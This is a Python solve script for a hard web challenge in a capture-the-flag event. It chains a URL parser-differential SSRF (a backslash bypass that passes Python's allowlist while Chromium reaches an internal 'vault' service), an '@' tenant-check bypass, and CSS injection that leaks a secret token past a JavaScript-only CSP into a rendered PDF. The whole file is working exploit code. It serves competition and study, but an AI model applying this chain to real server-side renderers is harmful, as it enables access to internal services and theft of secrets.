#!/usr/bin/env python3
"""
Chromium's Mirage - BCS CTF 2026 (Web, Hard)

Chain:
  1. Parser-differential SSRF: Python's urlsplit() sees hostname=report-portal.local
     (passes the gateway's allowlist), while Chromium's WHATWG URL parser rewrites the
     backslash to a slash and actually navigates to the internal `vault` service.
  2. The stray '@' left behind by that rewrite is eaten by vault's tenant.lstrip("@"),
     satisfying its own tenant check.
  3. The reflected `theme` query param is injected raw into a <style> block. CSS alone
     (content: attr(data-token)) pulls the flag out of a data-* attribute and paints it
     as visible text, working around a `script-src 'none'` CSP that only blocks JS.

Usage:
    python3 solve.py [gateway_base_url]

Default gateway_base_url: http://172.16.38.22:14500
"""
import sys
import re
import json
import urllib.parse
import urllib.request

GATEWAY = sys.argv[1] if len(sys.argv) > 1 else "http://172.16.38.22:14500"
OUT_PDF = "flag.pdf"


def build_payload_url() -> str:
    # CSS that reads the flag out of #vault's data-token attribute and renders it as
    # visible page text - no JavaScript needed, so script-src 'none' never applies.
    css = (
        "#vault::before{"
        "content:attr(data-token);"
        "display:block;"
        "font-size:40px;"
        "color:#000"
        "}"
    )
    theme = urllib.parse.quote(css, safe="")

    # Backslash parser differential:
    #   Python urlsplit(...).hostname -> "report-portal.local"  (passes allowlist)
    #   Chromium (WHATWG URL)         -> navigates to vault:15000/@report-portal.local/...
    return f"http://vault:15000\\@report-portal.local/admin/view?theme={theme}"


def main() -> None:
    url = build_payload_url()
    print("[*] Payload URL:")
    print("   ", url)

    body = json.dumps({"url": url}).encode()
    req = urllib.request.Request(
        f"{GATEWAY}/render",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    print(f"[*] POST {GATEWAY}/render")
    with urllib.request.urlopen(req, timeout=60) as resp:
        pdf_bytes = resp.read()
        print(f"[+] HTTP {resp.status}, {len(pdf_bytes)} bytes")

    with open(OUT_PDF, "wb") as f:
        f.write(pdf_bytes)
    print(f"[+] Saved {OUT_PDF}")

    flag_re = re.compile(rb"bcsctf\{[^}]*\}")
    found: set = set()

    # Preferred: pdftotext does real PDF text-layout reconstruction, which is required
    # here - the flag's glyphs are emitted across multiple Tj/TJ runs with per-character
    # kerning, so it is never a contiguous byte string inside the raw content stream.
    text = None
    try:
        import subprocess
        text = subprocess.run(
            ["pdftotext", OUT_PDF, "-"],
            capture_output=True, timeout=15,
        ).stdout
    except Exception:
        pass

    if text:
        found.update(flag_re.findall(text))

    if not found:
        # Fallback if pdftotext isn't installed: naive scan of decompressed content
        # streams. Kept only as a best-effort backstop - as noted above, it will
        # usually find nothing for this particular PDF's glyph layout.
        import zlib

        found.update(flag_re.findall(pdf_bytes))
        for m in re.finditer(rb"stream\r?\n(.*?)endstream", pdf_bytes, re.DOTALL):
            try:
                dec = zlib.decompress(m.group(1))
            except Exception:
                continue
            found.update(flag_re.findall(dec))

    if found:
        for flag in found:
            print("[+] FLAG:", flag.decode())
    else:
        print("[!] No flag pattern found automatically - inspect flag.pdf manually "
              "(e.g. install poppler-utils and run `pdftotext flag.pdf -`).")


if __name__ == "__main__":
    main()
